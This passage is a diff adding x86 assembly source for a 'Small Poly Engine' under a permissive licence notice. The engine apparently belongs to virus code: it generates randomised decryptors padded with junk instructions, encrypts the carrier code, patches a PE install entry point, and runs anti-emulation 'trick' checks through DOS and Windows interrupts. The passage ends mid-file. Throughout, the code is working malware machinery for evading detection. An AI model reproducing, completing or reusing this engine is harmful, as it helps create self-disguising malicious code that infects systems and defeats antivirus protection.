@@ -1,0 +1,1823 @@
+   ;COMMENT /
+   ;  (C) VBA Ltd. ALL RIGHTS RESERVED.
+   ;  E-mail: support@vba.com.by
+   ;
+   ;  THIS PROGRAM IS FREE FOR COMMERCIAL AND NON-COMMERCIAL USE.
+   ;
+   ;  REDISTRIBUTION AND USE IN SOURCE AND BINARY FORMS, WITH OR WITHOUT
+   ;  MODIFICATION, ARE PERMITTED.
+   ;
+   ;  THIS SOFTWARE IS PROVIDED BY VBA LTD. ``AS IS'' AND
+   ;  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+   ;  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+   ;  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+   ;  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+   ;  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+   ;  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+   ;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+   ;  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+   ;  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+   ;  SUCH DAMAGE.
+   ;/
+
+   ;--------------------------------------
+   ;SMALL POLY ENGINE (16/32 PART)
+   ;ENTRY: ECX=0,DS=ES=16BIT/BASE=START,SS=FLAT32
+   ;EXIT: DI=LENGTH DECRYPTOR+CODE+SOME SHIT(FULL LENGTH) - FOR SPE16(ENCRYPT_BUFF)
+   ;        =LENGTH DECRYPTOR - FOR SPE32(SPE32_BUFF - DECRYPTOR)
+
+   OFF_SPE     =   $-START
+
+   SPE     PROC    FAR
+
+   DWORD_REG   ENUM    _EAX,_ECX,_EDX,_EBX,_ESP,_EBP,_ESI,_EDI
+   WORD_REG    ENUM    _AX,_CX,_DX,_BX,_SP,_BP,_SI,_DI
+   BYTE_REG    ENUM    _AL,_CL,_DL,_BL,_AH,_CH,_DH,_BH
+   SEGM_REG    ENUM    _ES,_CS,_SS,_DS
+   FREE_SREG   =   _SS SHL 3
+   FREE_WREG   =   1 SHL _SP
+   ADD_R       =   00B
+   ADD_RB      =   01B
+   ADD_RD      =   10B
+   ADD_RIMM    =   11B
+   UNUSED_REG  =   0FFH
+
+           MOV DX,OFF_GET_RAND_2
+           MOV BX,ADDRESS_BUFF
+           MOV [BX-2],BX
+           CALL    GET_RAND_WORD
+           MOV 2 PTR DS:FIRST_MASK,AX
+           XOR BP,BP
+           XOR DI,DI
+           CMP 1 PTR [DI],0E9H
+           JE  SPE32
+           PUSH    AX
+           CALL    GET_RAND_WORD
+           MOV 2 PTR DS:SECOND_MASK,AX
+           PUSH    AX
+           XCHG    AX,DI               ;AX=0
+           MOV DI,SEEK_TABLE
+           MOV CL,LEN_DECRYPTOR
+           MOV [DI-2],CX           ;SMALL 2 PTR DS:LEN_SEEK
+           MOV SMALL 1 PTR DS:SHIT_FLAG,AL
+           PUSH    CX
+   FILL_SEEK:  STOSB
+           INC AX
+           LOOP    FILL_SEEK
+           MOV AL,0FFH             ;END SEEK_TABLE MARKER
+           STOSB
+           POP CX
+           MOV SI,DECRYPTOR
+           REP MOVSB
+           MOV CH,LEN_MAIN_BUFF SHR 9
+           PUSH    DI
+   FILL_BUFF:  CALL    GET_RAND_WORD
+           STOSW
+           LOOP    FILL_BUFF
+           POP DI
+           CALL    GET_TRICK
+           CALL    GET_RAND_8
+           ADD AL,LEN_DECRYPTOR
+           XCHG    AX,CX
+   ENCODE_SHIT:    PUSH    CX
+           CALL    ENCRYPT_ITER
+   NO_GEN_ENCRYPT: CALL    GET_TRICK
+           POP CX
+           LOOP    ENCODE_SHIT
+           MOV SI,ADDRESS_BUFF
+           MOV CL,LEN_DECRYPTOR
+   NEXT_CORRECT:   LODSW
+           XCHG    AX,BX
+           MOV AX,DI
+           SUB AX,SMALL ENCRYPT_BUFF-100H
+           ADD [BX],AX
+           LOOP    NEXT_CORRECT
+   DONT_CORRECT:   MOV SI,TEMP_DECRYPTOR
+           MOV CL,LEN_DECRYPTOR
+           REP MOVSB
+   ;MOVE AND ENCRYPT CODE
+           XOR SI,SI               ;OFFSET START-100H
+           MOV CX,OUR_LEN
+           PUSH    DI CX
+           REP MOVSB
+           POP CX DI BX AX
+   ENCRYPT_CODE:   XOR [DI],AX
+           SUB AX,BX
+           INC DI
+           LOOP    ENCRYPT_CODE
+           CALL    GET_RAND_WORD
+           MOV CL,AL
+           INC CX
+   GEN_END_SHIT:   CALL    GET_RAND_WORD
+           STOSB
+           LOOP    GEN_END_SHIT
+           SUB DI,SMALL ENCRYPT_BUFF
+           DB  66H
+           RET
+           ENDP
+
+   ;======================================
+   SPE32:
+           CALL    DX
+           MOV SMALL 1 PTR DS:WORD_MODE,AL
+           MOV 2 PTR [DI+1],PE_INSTALL-5
+           MOV DI,RESTORE_REGS
+           MOV CL,LEN_FILL_RESTORE
+           MOV AX,9090H
+           PUSH    DI
+           REP STOSB               ;FILL NOP
+           MOV DI,LOOP_CR
+           JNE @@ISNOP1
+           MOV AX,1234H
+           ORG $-2
+           SHR CX,1
+   @@ISNOP1:   STOSW
+           PUSHF
+           SCASW                   ;SKIP SHR E/DI
+           POPF
+           MOV AL,2
+           JNE @@ISNOP2
+           MOV AL,4
+   @@ISNOP2:   STOSB
+           PUSHF
+           SCASW                   ;SKIP MOV EBX,[EDI]
+           POPF
+           MOV CL,LEN_FILL_CRYPT
+           MOV AL,90H
+           PUSH    DI
+           REP STOSB
+           JE  @@ISNOP3
+           MOV AL,66H
+   @@ISNOP3:   STOSB
+           MOV EBP,12345678H
+   OFF_FIXUP   =   $-START-4
+           MOV DI,COUNT_REG
+           XCHG    AX,CX
+           DEC AX
+           MOV SMALL 2 PTR DS:PUSHED_REGS,AX
+           STOSW                   ;FILL 7 BYTES
+           STOSW
+           STOSW
+           STOSB
+           MOV 1 PTR [DI-24H],FREE_WREG    ;SMALL 1 PTR DS:DIRTY_WREG
+           INC DI
+           MOV SI,INIT_LIST
+           CALL    RANDOM_CALL
+           CALL    GET_FREE_REG
+           MOV SMALL 1 PTR DS:WORK_REG,BL
+           CALL    GEN_PUSH
+           POP BP
+           PUSH    DI              ;FOR LOOP
+           CALL    RANDOM_CALL
+           CALL    GET_SHIT
+           CALL    CHANGE_WORK_REG_RELO
+           CALL    GET_SHIT
+           CALL    STORE_WORK_REG_RELO
+           CALL    GET_SHIT
+           CALL    CHANGE_OFF_REG_RELO     ;SI=SMALL 1 PTR DS:DEC_OFF_COUNT
+           MOV SMALL 1 PTR DS:WORD_MODE,0
+           MOV BL,[SI+2]           ;SMALL 1 PTR DS:COUNT_REG
+           AND BL,BL
+           JS  CMP_IMM
+           CALL    GET_RAND_4
+           JE  CMP_IMM
+           CMP BL,_ECX
+           JNE NO_LOOP
+           CALL    GET_RAND_4
+           XCHG    AX,CX
+           MOV AL,0E2H             ;LOOP
+           JE  SMALL_JI
+   NO_LOOP:    MOV AL,1
+           CALL    GEN_DEC             ;SI=SMALL 1 PTR DS:DEC_OFF_COUNT
+           DEC AX
+           MOV AL,3
+           JE  NO_SIGNED
+           DEC AX
+   NO_SIGNED:  CALL    GET_RAND_BYTE
+           JE  LET_JNZ
+           DEC AX
+           JNE LET_JA
+           MOV AL,7FH              ;JG
+           JMP CALC_JI
+   CMP_IMM:    MOV ECX,[SI-4]          ;SMALL 4 PTR DS:TOP_ADDRESS
+           MOV BL,[SI+1]           ;SMALL 1 PTR DS:OFF_REG
+           AND BL,BL               ;_EAX
+           JNE NO_EAX
+           CALL    GET_RAND_4
+           JE  NO_EAX
+           MOV AL,3DH              ;CMP EAX
+           STOSB
+           STC
+           JMP SAVE_CMP_OFF
+   NO_EAX:     MOV AX,0F881H           ;CMP
+           OR  AH,BL
+           CALL    CHECK_SIGN
+           STOSW
+   SAVE_CMP_OFF:   XCHG    EAX,ECX
+           JNB SIGN_OPCODE
+           STOSD
+           CMP AL,12H
+           ORG $-1
+   SIGN_OPCODE:    STOSB
+   CHOOSE_JI:  CALL    DX
+   LET_JA:     SHL AL,1
+   LET_JNZ:    OR  AL,75H              ;JNZ
+   CALC_JI:    PUSH    AX
+           CALL    DX
+           XCHG    CX,AX
+           POP AX
+           JE  SMALL_JI
+           MOV 1 PTR [DI],0FH
+           INC DI
+           ADD AL,10H
+   SMALL_JI:   STOSB
+           POP AX
+           SUB AX,DI
+           DEC AX
+           JCXZ    IS_SMALL
+           SUB AX,3
+           CWDE
+           STOSD
+           CMP AL,12H
+           ORG $-1
+   IS_SMALL:   STOSB
+           CALL    GET_SHIT
+           CALL    GET_RAND_4
+           MOV AX,0FFC4H
+           MOV SMALL 2 PTR DS:ADDRESS_MODE,AX
+           MOV AL,_ESP
+           JE  LET_ESP
+   TRY_NEXT:   MOV SI,OFF_REG
+           CALL    GET_RAND_4
+           ADD SI,AX
+           MOV AL,[SI]
+           CMP AL,0FFH
+           JE  TRY_NEXT
+           MOV CL,90H              ;50H-0C0H
+           PUSH    AX
+           CALL    MOVE_TO
+           POP AX
+   LET_ESP:    PUSH    AX
+           CALL    GET_RAND_3
+           DEC AX
+           XCHG    AX,SI
+           JS  GO_RETN
+           MOV CX,0E0FFH           ;JMP REG
+           JE  JMP_ESP_X
+           MOV CH,0D0H             ;CALL REG
+           MOV 2 PTR [SI],PE_INSTALL_POP-5
+           CALL    GET_RAND_WORD
+           MOV SMALL 4 PTR DS:INTRUD_OFF,EAX
+   JMP_ESP_X:  POP AX
+           OR  CH,AL
+           XCHG    AX,CX
+           JMP JMP_ESP
+   GO_RETN:    POP AX
+           ADD AL,50H              ;PUSH
+           STOSB
+           CALL    GET_SHIT
+           CALL    DX
+           ADD AL,0C2H
+           STOSB
+           MOV AL,AH
+           JP  NO_ZERO_FILL
+   JMP_ESP:    STOSW
+   NO_ZERO_FILL:   XCHG    AX,DI
+           SUB AX,SMALL SPE32_BUFF
+           MOV SMALL 2 PTR DS:ENCRYPTOR_LEN,AX
+           POP DI
+           PUSH    AX
+           MOV SI,PUSHED_REGS
+           MOV BX,2
+   NEXT_REST_REG:  MOV AL,8BH              ;MOV DREG,[ESP+XXXXXXXX]
+           STOSB
+           MOV AL,[BX+SI]
+           SHL AL,3
+           OR  AL,84H
+           MOV AH,24H
+           STOSW
+           MOVZX   EAX,1 PTR [SI]
+           SHL AX,2
+           ADD EAX,SMALL 4 PTR DS:CURRENT_LEN
+           STOSD
+           INC BX
+           DEC 1 PTR [SI]
+           JNS NEXT_REST_REG
+           POP DI
+           DB  66H
+           RETF
+
+   ;--------------------------------------
+   CHK_MODE:   CMP SMALL 1 PTR DS:WORD_MODE,0
+           RETN
+
+   ;--------------------------------------
+   CHK_MODE_PRFX:  PUSH    AX
+           CALL    CHK_MODE
+           JE  @@NO_WMODE
+           MOV AL,66H              ;TURN TO 16BIT REG
+           STOSB
+   @@NO_WMODE: POP AX
+           RETN
+
+   ;--------------------------------------
+   CHK_MODE_SZ:    CALL    CHK_MODE
+           MOV AL,4
+           JE  @@NO_WMODE
+           MOV AL,2
+   @@NO_WMODE: RETN
+
+   ;--------------------------------------
+   ;ENTRY:BL=REG NUMBER
+   GEN_PUSH:   PUSH    BX SI
+           MOV AL,BL
+           MOV SI,PUSHED_REGS
+           INC 2 PTR [SI]
+           MOV BX,[SI]
+           MOV [BX+SI+2],AL
+           ADD AL,50H              ;PUSH
+           STOSB
+           ADD SMALL 2 PTR DS:COUNT_RET,4
+           POP SI BX
+           RETN
+
+   ;--------------------------------------
+   ;ENTRY: SI=FIRST OFFSET,AL=HIGH LIMIT
+   RANDOM_CALL:    LODSB
+           CBW
+           MOV CX,AX
+           CALL    GET_RAND_BYTE
+           SHL AX,1
+           XCHG    AX,BX
+           MOV AX,[BX+SI]
+           XCHG    AX,[SI]
+           MOV [BX+SI],AX
+   RCALL_NEXT: PUSH    CX SI
+           CALL    GET_SHIT
+           CALL    2 PTR [SI]
+           POP SI CX
+           LODSW
+           LOOP    RCALL_NEXT
+   NO_INIT:    RETN
+
+   ;--------------------------------------
+   CHANGE_WORK_REG =   $-START
+   CHANGE_WORK_REG_RELO:
+           MOV BX,MASK_REG
+           MOV AL,UNUSED_REG
+           CMP AL,[BX+3]           ;SMALL 1 PTR DS:CHG_WR_FLAG
+           JNE NO_INIT
+           CMP AL,[BX+3+1]         ;SMALL 1 PTR DS:SET_WR_FLAG
+           JE  NO_INIT
+           INC 1 PTR [BX+3]            ;SMALL 1 PTR DS:CHG_WR_FLAG
+           PUSH    BX
+           CALL    CHANGE_ESP
+           POP BX
+           CALL    CHK_MODE
+           JE  @@NO_WMODE
+           MOV AL,66H
+           CALL    BUILD_CBYTE
+   @@NO_WMODE: MOV CL,[BX+1]           ;SMALL 1 PTR DS:WORK_REG
+           MOV CH,UNUSED_REG
+           CMP CH,[BX]
+           JE  GO_GET_OP32
+           CALL    GET_RAND_4
+           JNE NO_GET_OP32
+   GO_GET_OP32:    CALL    CHK_MODE
+           MOV AL,LEN_OP32_IMM
+           JE  GET_OP32
+           DEC AX              ;SKIP BSWAP WITH 66H PREFIX
+           JMP GET_OP32
+   NO_GET_OP32:    MOV SI,OP32_REG_CHG
+           CALL    GET_RAND_3
+           ADD SI,AX
+           MOVSB
+           MOV AL,[SI+LEN_OP32_REG_CHG-1]
+           MOV AH,0D8H
+           CALL    BUILD_CRYPT
+           MOV CH,[BX]
+           CALL    DX
+           JE  NO_XCHG
+           XCHG    CL,CH
+           XOR 1 PTR [DI-1],2
+   NO_XCHG:    SHL CL,3
+           OR  CL,CH
+           XCHG    AX,CX
+           OR  AL,0C0H
+           STOSB
+           RETN
+
+   ;--------------------------------------
+   CHANGE_MASK_REG =   $-START
+           CALL    CHANGE_ESP
+           MOV CL,SMALL 1 PTR DS:MASK_REG
+           AND CL,CL
+           JS  OUT_CHG_MASK
+           XOR CH,CH
+           MOV AL,LEN_OP32_IMM
+   GET_OP32:   MOV SI,OP32_IMM
+           CALL    GET_RAND_BYTE
+           SHL AX,1
+           XCHG    AX,BX
+           JNE NO_BTC
+           MOV AL,0FH
+           CALL    BUILD_CBYTE
+   NO_BTC:     AND CH,CH
+           JE  NO_REVERSE_OP
+           NEG BX
+           MOV AX,[BX+SI-2]
+           CALL    BUILD_CRYPT
+           NEG BX
+           STC
+   NO_REVERSE_OP:  MOV AX,[BX+SI]
+           JB  REVERSE_OP
+           CALL    BUILD_CRYPT
+   REVERSE_OP: OR  AH,CL
+           CMP AL,90H
+           JNE BINARY_OPCODE
+           MOV AL,AH
+           STOSB
+           RETN
+   BINARY_OPCODE:  STOSW
+           CMP AL,0FH
+           JE  OUT_CHG_MASK
+           CMP AL,0D1H
+           JAE OUT_CHG_MASK
+           CMP AL,81H
+           PUSHF
+           CALL    GET_RAND_WORD
+           POPF
+           JE  STOS_DWORD
+           AND AL,1FH
+   BUILD_CBYTE:    STOSB
+   BUILD_BYTE: MOV DS:[BP],AL
+           INC BP
+   OUT_CHG_MASK:   RETN
+   STOS_DWORD: AND CH,CH
+           JE  @@NO_WMODE
+           CALL    CHK_MODE
+           JE  @@NO_WMODE
+           STOSW
+           JMP BUILD_CRYPT
+   @@NO_WMODE: STOSD
+           CALL    BUILD_CRYPT32
+           JMP JUST_INC
+
+   ;--------------------------------------
+   BUILD_CRYPT32:  DB  66H
+   BUILD_CRYPT:    MOV DS:[BP],AX
+   JUST_INC:   INC BP
+           INC BP
+           RETN
+
+   ;--------------------------------------
+   MOV_WORK_REG    =   $-START
+           CALL    CHANGE_ESP
+           MOV SI,WORK_REG
+           INC 1 PTR [SI+3]            ;SMALL 1 PTR DS:SET_WR_FLAG
+           MOV CL,30H
+
+   ;--------------------------------------
+   ;ENTRY: CL=30H (PUSH [][]+XX) OR CL=90H (PUSH DREG)
+   ;       1 PTR [SI]=REG
+   MOVE_TO:    MOV BL,[SI]
+           CALL    GET_RAND_3
+           DEC AX
+           JNE NO_MOV
+           MOV AL,8BH              ;MOV
+           JMP SAVE_ADDRESS
+   NO_MOV:     JNS NO_PUSH
+           CALL    CHK_MODE_PRFX
+           AND CL,CL
+           PUSHF
+           JS  NO_FF
+           STOSB
+   NO_FF:      MOV BL,CL               ;PUSH
+           CALL    PUSH_CASE
+           POPF
+           JNS IS_FF
+           DEC DI
+   IS_FF:      CALL    GET_SHIT
+           MOV AL,58H              ;POP
+           OR  AL,[SI]
+           JMP CHK_MODE_PSTOR
+   NO_PUSH:    CALL    MOV_ZERO32
+           MOV SI,OP32_REG
+           CALL    GET_RAND_3
+           ADD SI,AX
+           LODSB
+   SAVE_ADDRESS:   CALL    CHK_MODE_PSTOR
+           SHL BL,3
+   PUSH_CASE:  MOV AX,SMALL 2 PTR DS:ADDRESS_MODE
+           ADD AL,BL
+           MOV EBX,SMALL 4 PTR DS:DELTA_VALUE
+           CMP AH,0FFH
+           JE  NO_EXT_OPCODE
+           STOSW
+           TEST    AH,0C0H
+           JNE STORE_DWORD
+           CMP AL,12H
+           ORG $-1
+   NO_EXT_OPCODE:  STOSB
+           AND AL,0C0H
+           JP  NO_STORE
+           JS  STORE_DWORD
+           XCHG    AX,BX
+           STOSB
+   NO_STORE:   RETN
+   STORE_DWORD:    XCHG    EAX,EBX
+   GO_STOS_DWORD:  STOSD
+           RETN
+
+   ;--------------------------------------
+   STORE_WORK_REG  =   $-START
+   STORE_WORK_REG_RELO:
+           MOV AL,UNUSED_REG
+           MOV SI,DEC_ESP_COUNT
+           CMP AL,[SI-1]           ;SMALL 1 PTR DS:SET_WR_FLAG
+           JE  NO_STORE_WR
+           CMP AL,[SI-2]           ;SMALL 1 PTR DS:CHG_WR_FLAG
+           JE  NO_STORE_WR
+           CMP AL,[SI-3]           ;SMALL 1 PTR DS:STORE_WR_FLAG
+           JNE NO_STORE_WR
+           INC 1 PTR [SI-3]            ;SMALL 1 PTR DS:STORE_WR_FLAG
+           XOR AL,[SI]             ;SMALL 1 PTR DS:DEC_ESP_COUNT
+           JS  VIA_DEC_ESP
+           CALL    CHK_MODE_SZ
+           MOV [SI],AL
+           CALL    DX
+           JE  VIA_DEC_ESP
+           MOV AL,50H              ;PUSH
+           OR  AL,[SI-4]           ;SMALL 1 PTR DS:WORK_REG
+   CHK_MODE_PSTOR: CALL    CHK_MODE_PRFX
+   STOS_BYTE:  STOSB
+   NO_STORE_WR:    RETN
+   VIA_DEC_ESP:    MOV AL,[SI]
+           AND AL,AL
+           JNE DEC_ESP
+           MOV AL,89H              ;MOV
+           CALL    CHK_MODE_PSTOR
+           CALL    GET_RAND_3
+           ROR AL,2
+           OR  AL,4
+           MOV AH,[SI-4]           ;SMALL 1 PTR DS:WORK_REG
+           SHL AH,3
+           OR  AL,AH
+           MOV AH,24H
+           STOSW
+           TEST    AL,0C0H
+           JE  NO_STORE_WR
+           MOV AL,0
+           JNS STOS_BYTE
+           XOR EAX,EAX
+   GO1_STOS_DWORD: JMP GO_STOS_DWORD
+   DEC_ESP:    MOV BL,_ESP
+           CALL    GEN_DEC
+           JMP VIA_DEC_ESP
+
+   ;--------------------------------------
+   ;ENTRY: AL=MAX DEC VALUE, BL=REGISTER
+   ;EXIT : AL=DEC VALUE
+   GEN_DEC:    CALL    GET_SHIT
+           CALL    GET_RAND_BYTE
+           INC AX
+           MOVZX   ECX,AX
+           CALL    GET_RAND_3
+           JNE NO_DEC
+           MOV AL,48H              ;DEC
+           OR  AL,BL
+           STOSB
+           DEC 1 PTR [SI]
+           RETN
+   NO_DEC:     SUB [SI],CL
+           CALL    DX
+           SHL AL,1
+           OR  AL,81H
+           STOSB
+           PUSHF
+           CALL    DX
+           MOV AL,0E8H             ;SUB
+           JE  IS_SUB
+           MOV AL,0C0H             ;ADD
+           NEG ECX
+   IS_SUB:     OR  AL,BL
+           STOSB
+           XCHG    EAX,ECX
+           POPF
+           JP  GO1_STOS_DWORD
+           STOSB
+   NO_CHG_OFF: RETN
+
+   ;--------------------------------------
+   CHANGE_OFF_REG  =   $-START
+   CHANGE_OFF_REG_RELO:
+           MOV SI,DEC_OFF_COUNT
+           CMP 1 PTR [SI+7],UNUSED_REG     ;SMALL 1 PTR DS:SET_WR_FLAG
+           JE  NO_CHG_OFF
+   NEXT_OFF_REG:   MOV AL,[SI]
+           AND AL,AL
+           JE  NO_CHG_OFF
+           MOV BL,[SI+1]           ;SMALL 1 PTR DS:OFF_REG
+           CALL    GEN_DEC
+           JMP NEXT_OFF_REG
+
+   ;--------------------------------------
+   CHANGE_ESP: CALL    GET_RAND_4
+           MOV SI,DEC_ESP_COUNT
+           JNE NO_CHG_ESP
+           CMP AL,[SI-3]           ;SMALL 1 PTR DS:STORE_WR_FLAG
+           JE  NO_CHG_OFF
+           MOV AL,[SI]
+           AND AL,AL
+           JE  NO_CHG_ESP
+           JNS NO_INIT_DESP
+           CALL    CHK_MODE_SZ
+           MOV [SI],AL
+   NO_INIT_DESP:   MOV BL,_ESP
+           CALL    GEN_DEC
+   NO_CHG_ESP: CALL    GET_RAND_4
+           JNE NO_CHG_OFF
+           XOR AL,[SI-1]           ;SMALL 1 PTR DS:SET_WR_FLAG
+           JS  NO_CHG_OFF
+           MOV SI,DEC_OFF_COUNT
+           MOV AL,[SI]
+           AND AL,AL
+           JE  NO_CHG_OFF
+           MOV BL,[SI+1]           ;SMALL 1 PTR DS:OFF_REG
+           JMP GEN_DEC
+
+   ;--------------------------------------
+   INIT_OFF    =   $-START
+           MOV SI,ADDRESS_MODE
+           CALL    GET_FREE_REG
+           MOV [SI+13H],BL         ;SMALL 1 PTR DS:OFF_REG
+           CALL    GEN_PUSH
+           CALL    GET_SHIT
+           CMP BL,_EBP
+           JNE THREE_MODE
+           CALL    DX
+           INC AX
+           JMP EBP_MODE
+   THREE_MODE: CALL    GET_RAND_3
+   EBP_MODE:   XOR CX,CX
+           ROR AL,2
+           MOV [SI],AX
+           XOR CX,CX
+           CALL    DX
+           JE  SHORT_OPCODE
+           MOV AX,2004H
+           OR  AH,BL
+           MOV BH,BL
+           SHL BH,3
+           PUSH    AX
+           CALL    GET_RAND_4
+           DEC AX
+           DEC AX
+           POP AX
+           JE  EXT_MODE
+           MOV AH,BL
+           JP  SECOND_M_MODE
+           MOV 1 PTR [SI],0
+           MOV AH,45H
+           JS  SECOND_M_MODE
+           CALL    CHK_MODE
+           JNE SECOND_M_MODE
+           INC CX
+           MOV AH,85H
+   SECOND_M_MODE:  INC CX
+           OR  AH,BH
+           OR  [SI],AX
+           TEST    2 PTR [SI],0C0C0H
+           JMP GET_RAND_DWORD
+   SHORT_OPCODE:   MOV AH,0FFH
+           MOV AL,BL
+   EXT_MODE:   OR  [SI],AX
+           TEST    1 PTR [SI],(ADD_RIMM SHL 6)
+   GET_RAND_DWORD: JE  GO_MOV_WREG
+           CALL    GET_RAND_WORD
+           AND AL,NOT 3
+           TEST    1 PTR [SI],(ADD_RB SHL 6)
+           JE  NO_ADD_RB
+           CBW
+           CWDE
+   NO_ADD_RB:  SUB EBP,EAX
+           MOV [SI+6],EAX          ;SMALL 4 PTR DS:DELTA_VALUE
+   GO_MOV_WREG:    XOR EAX,EAX
+           CALL    CHK_MODE_SZ
+           SUB EBP,EAX
+           SHR AL,CL
+           MOV [SI+12H],AL         ;SMALL 1 PTR DS:DEC_OFF_COUNT
+           SHR EBP,CL
+           MOV [SI+2],EBP          ;SMALL 4 PTR DS:OFF_VALUE
+           MOV EAX,SMALL 4 PTR DS:CURRENT_LEN
+           SHR EAX,CL
+           MOV ECX,EBP
+           SUB EBP,EAX
+           MOV [SI+0EH],EBP            ;SMALL 4 PTR DS:TOP_ADDRESS
+           JMP MOV_WREG
+
+   ;--------------------------------------
+   INIT_COUNT  =   $-START
+           CALL    GET_RAND_4
+           JE  NO_INIT
+           CALL    GET_FREE_REG
+           MOV SMALL 1 PTR DS:COUNT_REG,BL
+           CALL    GEN_PUSH
+           MOV ECX,SMALL 4 PTR DS:CURRENT_LEN
+           SHR ECX,1
+           CALL    CHK_MODE
+           JNE IS_WM
+           SHR ECX,1
+   IS_WM:      JMP MOV_WREG_SH
+
+   ;--------------------------------------
+   INIT_MASK   =   $-START
+           CALL    GET_RAND_4
+           JE  NO_INIT
+           CALL    GET_FREE_REG
+           MOV SMALL 1 PTR DS:MASK_REG,BL
+           CALL    GEN_PUSH
+           CALL    GET_RAND_WORD
+           MOV SMALL 4 PTR DS:MASK_VALUE,EAX
+           MOV SMALL 4 PTR DS:MASK_CR,EAX
+           XCHG    EAX,ECX
+   MOV_WREG_SH:    CALL    GET_SHIT
+           JMP MOV_WREG
+
+   ;======================================
+   ENCRYPT_ITER:   MOV CX,SMALL 2 PTR DS:LEN_SEEK
+           JCXZ    NO_CODE_ITER
+           CALL    GET_ENCRYPT
+           MOV AX,[SI+SIZE_ENCRYPT_TBL-2]
+           MOV 2 PTR DS:BUFF4ENCRYPT,AX
+           PUSHF
+           MOV BX,ADDRESS_EMPTY
+           MOV SI,[BX]
+           MOV [SI],DI
+           LODSW
+           MOV [BX],SI
+           MOV AL,CL
+           CALL    GET_RAND_BYTE
+           ADD AX,SMALL SEEK_TABLE
+           XCHG    AX,SI
+           LODSB
+           CBW
+           STOSW
+           ADD AX,SMALL TEMP_DECRYPTOR
+           XCHG    AX,BX
+           DEC CX
+           MOV SMALL 2 PTR DS:LEN_SEEK,CX
+           JE  IS_LAST_OFF
+   SEEK_MOVE:  LODSB
+           MOV [SI-2],AL
+           CMP AL,0FFH
+           JNE SEEK_MOVE
+   IS_LAST_OFF:    CALL    GET_RAND_WORD
+           POPF
+           JA  UNARE_OPCODE
+           STOSB
+           XCHG    CX,AX
+   UNARE_OPCODE:
+   BUFF4ENCRYPT    =   $-START
+           DW  1234H
+   NO_CODE_ITER:   RETN
+
+   ;--------------------------------------
+   GET_ENCRYPT:    MOV AL,SIZE_ENCRYPT_TBL/2
+           CALL    GET_RAND_BYTE
+           SHL AX,1
+           ADD AX,SMALL ENCRYPT_TBL
+           XCHG    AX,SI
+           LODSW
+           STOSW
+           CMP AL,0C0H
+           RETN
+
+   ;--------------------------------------
+   GET_TRICK:  MOV SMALL 1 PTR DS:DIRTY_WREG,FREE_WREG
+           MOV SMALL 1 PTR DS:DIRTY_SREG,FREE_SREG
+           CALL    GET_SHIT
+           MOV SI,TRICK_TBL
+           MOV AL,SIZE_TRICK_TBL
+
+   ;--------------------------------------
+   ;SI=TABLE,AL=HIGH LIMIT
+   CALL_RANDOM:    CALL    GET_RAND_BYTE
+           SHL AX,1
+           ADD SI,AX
+           JMP 2 PTR [SI]
+
+   ;--------------------------------------
+   ;MOV    AX,30XXH
+   ;INT    21H
+   ;CMP    AL,7/CMP AL,6
+   ;JAE    @@OK/JA @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_1     =   $-START
+           MOV CH,30H
+           CALL    MOV_AH
+           CALL    GEN_INT21
+           MOV CL,7
+           JMP CMP_JAX_AL
+
+   ;--------------------------------------
+   ;MOV    AX,19XXH
+   ;INT    21H
+   ;CMP    AL,'Z'-'A'/'Z'-'A'+1
+   ;JBE    @@OK/JB @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_2     =   $-START
+           MOV CH,19H
+           MOV AL,'Z'-'A'
+           CMP EAX,12345678H
+           ORG $-4
+
+   ;--------------------------------------
+   ;MOV    AX,2AXXH
+   ;INT    21H
+   ;CMP    AL,6/7
+   ;JBE    @@OK/JB @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_3     =   $-START
+           MOV CH,2AH
+           MOV AL,6
+           CMP EAX,12345678H
+           ORG $-4
+
+   ;--------------------------------------
+   ;MOV    AX,54XXH
+   ;INT    21H
+   ;CMP    AL,1/2
+   ;JBE    @@OK/JB @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_4     =   $-START
+           MOV CH,54H
+           MOV AL,1
+           PUSH    AX
+           CALL    MOV_AH
+           JMP CMP_JBX_AL
+
+   ;--------------------------------------
+   ;MOV    AX,5802H
+   ;INT    21H
+   ;CMP    AL,1/2
+   ;JBE    @@OK/JB @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_5     =   $-START
+           MOV CX,5802H
+           MOV AL,1
+           PUSH    AX
+           CALL    MOV_AX
+   CMP_JBX_AL: CALL    GEN_INT21
+           POP CX
+           MOV BH,76H              ;JBE
+           JMP GO_CMP_JXX_AL
+
+   ;--------------------------------------
+   ;MOV    AX,1600H
+   ;INT    2FH
+   ;CMP    AL,4/CMP AL,3
+   ;JAE    @@OK/JA @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_6     =   $-START
+           XOR CL,CL
+           CALL    MOV_WIN
+           MOV CL,4
+   CMP_JAX_AL: MOV BH,73H              ;JAE
+   GO_CMP_JXX_AL:  JMP CMP_JXX_AL
+
+   ;--------------------------------------
+   ;MOV    AX,1200H
+   ;INT    2FH
+   ;CMP    AL,0FFH
+   ;JE @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_7     =   $-START
+           MOV CX,1200H
+           MOV AL,0FFH
+           JMP GEN_CODE
+
+   ;--------------------------------------
+   ;MOV    AX,4300H
+   ;INT    2FH
+   ;CMP    AL,80H
+   ;JE @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_8     =   $-START
+           MOV CX,4300H
+           MOV AL,80H
+   GEN_CODE:   PUSH    AX
+           CALL    MOV_INT2F
+   CMP_JE_AL   =   $-START
+           POP CX
+           MOV BX,(74H SHL 8) OR _AL       ;JE
+           JMP CHECK_REG
+
